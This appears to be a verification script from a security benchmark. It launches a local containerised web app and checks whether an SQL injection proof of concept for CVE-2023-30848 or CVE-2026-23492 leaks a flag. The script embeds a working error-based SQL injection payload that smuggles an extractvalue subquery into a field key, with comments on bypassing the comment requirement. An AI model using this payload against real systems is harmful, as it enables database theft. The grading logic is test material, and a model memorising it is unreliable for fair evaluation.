#!/usr/bin/env bash
# verify.sh --seed|--residual
# 0 = admin Find JSON/error contains RUN_FLAG (extractvalue 1105)
# 10 = blocked / no flag   20 = env   30 = args
#
# Seed:     fields[] brick key + extractvalue + trailing `-- ` (CVE-2023-30848)
# Residual: same JOIN $ob concat, comment-free extractvalue (CVE-2026-23492)
#           inline literal — never heldout, never seed fallback.
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
JUDGE="$RUN_FLAG"
mkdir -p "$WORK_DIR"

PORT=""
for _ in $(seq 1 40); do
  PORT="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" \
    port "$VERSION" 80 2>/dev/null | sed 's/.*://' | tr -d '[:space:]' || true)"
  if [[ -n "$PORT" ]]; then
    code="$(curl -sS -m 5 -o /dev/null -w '%{http_code}' "http://127.0.0.1:${PORT}/admin/login" || true)"
    if [[ "$code" == "200" || "$code" == "302" ]]; then
      break
    fi
  fi
  sleep 2
  PORT=""
done
[[ -n "$PORT" ]] || { echo "verify: no published $VERSION:80 / admin not ready" >&2; exit 20; }
export PCB_TARGET_PORT="$PORT"

if [[ "$MODE" == "--seed" ]]; then
  "$PY" "$CASE_DIR/poc/original_poc.py" > "$WORK_DIR/cand.json"
else
  # residual CVE-2026-23492: same findAction JOIN $ob concat, NO `--`.
  # Code appends `_<cid> \`<ob>\` ON \`<ob>\`.o_id = ...`; ending the brick key
  # with `JOIN object_brick_query_bundledata` makes that suffix a real o_id table.
  cat > "$WORK_DIR/cand.json" <<'JSON'
{"probe_id":"cve-2026-23492-comment-free","fields":["bundledata___CID__ b ON 1=1 JOIN (SELECT extractvalue(1,concat(0x7e,(SELECT flag FROM pcb_secret LIMIT 1))) id) c ON 1=1 JOIN object_brick_query_bundledata~x"],"filter":"[{\"property\":\"id\",\"operator\":\"gt\",\"value\":\"0\",\"type\":\"numeric\"}]","class":"testclass","query":"test"}
JSON
fi

export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"
OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
echo "$OUT" | head -c 500; echo
"$PY" -c "
import json, sys
try:
    d = json.loads(sys.argv[1])
except Exception:
    sys.exit(20)
if d.get('http_status') is None and d.get('response') is None and d.get('body') is None:
    sys.exit(20)
body = str(d.get('body') or d.get('response') or d.get('fetched_body') or '')
rec = str(d.get('recovered_flag') or '')
sys.exit(0 if sys.argv[2] in body or sys.argv[2] in rec else 10)
" "$OUT" "$JUDGE"
